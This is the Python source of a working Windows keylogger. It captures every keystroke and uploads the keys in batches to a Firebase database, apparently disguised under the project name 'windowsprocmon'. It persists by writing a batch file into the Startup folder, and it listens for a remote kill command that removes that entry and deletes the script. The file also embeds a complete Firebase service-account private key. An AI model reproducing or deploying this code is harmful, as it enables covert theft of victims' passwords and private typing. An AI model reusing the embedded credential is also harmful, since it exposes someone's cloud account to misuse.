import os
import sys
import time
import json
import socket
import queue
import tempfile
import threading
import firebase_admin
from firebase_admin import credentials, db
import keyboard

# Firebase service account config
FIREBASE_JSON = {
    "type": "service_account",
    "project_id": "windowsprocmon",
    "private_key_id": "ae831d266d48526ebcf3d4110a8e86f04ecec685",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDOiCjZFXqC52fy\nWahD/bjwYT7qa+7Y7RpFcrEh4Ccj/Vqc83dMyNWU/ujDE/Kny45lNmmQHUoKEzaz\n/iIxOQIshABb791nTkrxRfe3U8XLYplzV+KYyHnAw6nZxtQQ43pqELU94tQCCC/6\nDSjInbIVIyrlGgVKCYoeeRjaYfid+qymWstIKF8WxXUWhqtMnX4EXod2CVSR8iQx\n0joNDEZq5AC4GqQ3CvggTPYMRwn4g4AHtLbvDOvnX9dVTwQ391n/T095zokMcCeq\nu384kLLq9ONHzKYTgfNn0YcyeAbfrpoZt3iO2mLLSycyJkLOEDqasiPQpZWZrAgj\nOXgq7DrdAgMBAAECggEAKxn1VGCMIbeDVOtrF01jBB93TtrZjMHmoqmt18D8yiD8\ngRa6Rfb/w8ly8AtAr83mWK8DVsUWB4Y8+1FE93rLPlkJ7iXf0chgEXwll0fPVoOs\nPIsRygrEhfsPflhlN2URzgLQoCqvTgFBafDHGx715D1jnU5R3kKhZXymOCUMCoO+\ntZ0b9t9ATheQUh6ssGPgLbcnbIE2h2sjdWNDcnjyCJb54JroCkf4FHPTBf3pq3xx\n9KplBwiEYjqBMxojoUrYzwRFTG9QODU/ItsWukHBJPby/bK19yFyoCTIGlz8iDeT\nWCvP4gPPWn8jLIV6vzPH6DtAG2QGS/JmI3Dfl2UfLQKBgQD4H8HcTvNF/BVlv2Dx\n0JPXBXcfzf17Lv3UdWgc/rqqsGVHsbIEz44TRsLEAssmCFbXoKO1+04clpsFm/jX\nMtXiyUQlbd2yNgT3g/2krOFQza6l/zVOaD7xTIJ88/41KyhqsXOTCYuy/OWF27Is\nPAFOesSs165li1Ku8uowrasF5wKBgQDVFm0uA7j/UuFarzt1jqt5QfZzgtLo5D4i\nxD5fqG6JQ1H12KEsz9aLVaOWFfhBkxvNwsHVjoxNU6wRDYWXqiLBWpj2aRFgdT9F\nMB1qI+fr5kfLNOfou6aNgQMniMhqh7slNgFyv3fzufxU2G9F0dGx+BMxZ/VNl8ds\nu5sCh14YmwKBgQDCB4uArVh95NgSveqgjpvdrI9wFpRfLOsfpkQpUGVGrzQ0MVfl\nfS08E7ygrRKRhjnq2trKp1946akGZObd2gn6E6uvnU+dWbLen5/Mk8iKeJ1Xf8/+\npXR7G3p7Hg4vI7WyYVvgorlU2YDfAWM+Rho7dbOw+eSN0bpxxtGuCVDRBwKBgQCE\ne18CHtpkE/l8Ujpbiopd5378rjfHCDEBmJVXD/c5bBuHCFqc69Nt6Z69b4db7cR5\nlz7AMdJVOVJff9KxStw07sjvWr+tAviFYbbICO7modO9KXWOIy0YCUAW0loYsa7P\nIdagqx4+8EFL1wzHkf4X8i6spv/CcD1TAwkK93KvRQKBgA8xmWvQOm2y55nCDwez\nsK90duXUyFShuDXtYViaq/NbbXHRfxNIbJzeu5puQdAkuG/7Jt/hPUV5Qj7Ths+c\njFCVWHpxtd+Mq36jdpHL6IUyGav4yTIvrZMkeg+F2+8QcBC0TPazUl8Y/sxbBFOW\nf1MSp2eow41vB/JtAANNjAq1\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-fbsvc@windowsprocmon.iam.gserviceaccount.com",
    "client_id": "110996699260438175267",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40windowsprocmon.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
}

# Identify device
device_name = socket.gethostname()

# Write Firebase credentials to temp file
with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.json') as f:
    f.write(json.dumps(FIREBASE_JSON).encode('utf-8'))
    config_path = f.name

# Firebase init
cred = credentials.Certificate(config_path)
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://windowsprocmon-default-rtdb.firebaseio.com/'
})

log_ref = db.reference(f'logs/{device_name}')
control_ref = db.reference(f'control/{device_name}')
print(f"✅ Firebase connected as {device_name}")

# Buffering
log_queue = queue.Queue()

def flush_buffer():
    while True:
        buffer = []
        while not log_queue.empty():
            buffer.append(log_queue.get())
        if buffer:
            try:
                log_ref.push({'keys': buffer})
                print(f"Sent {len(buffer)} keys")
            except Exception as e:
                print("Firebase push failed:", e)
        time.sleep(5)

# Key capture
def capture_keys():
    def on_key(event):
        log_queue.put(event.name)
    keyboard.on_press(on_key)
    threading.Thread(target=flush_buffer, daemon=True).start()
    keyboard.wait()

# Remote kill
def listen_for_kill():
    def check_kill():
        while True:
            if control_ref.child("delete").get():
                print("Kill signal received")
                remove_from_startup()
                try:
                    os.remove(os.path.realpath(sys.argv[0]))
                except:
                    pass
                os._exit(0)
            time.sleep(5)
    threading.Thread(target=check_kill, daemon=True).start()

# Startup setup
def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    bat_path = os.path.join(startup_folder, "logger.bat")
    script_path = os.path.realpath(sys.argv[0])
    if not os.path.exists(bat_path):
        with open(bat_path, "w") as f:
            f.write(f'start "" "{script_path}"\n')
        print("Added to startup")

def remove_from_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    bat_path = os.path.join(startup_folder, "logger.bat")
    if os.path.exists(bat_path):
        os.remove(bat_path)
        print("Startup entry removed")

# Run all
add_to_startup()
listen_for_kill()
capture_keys()
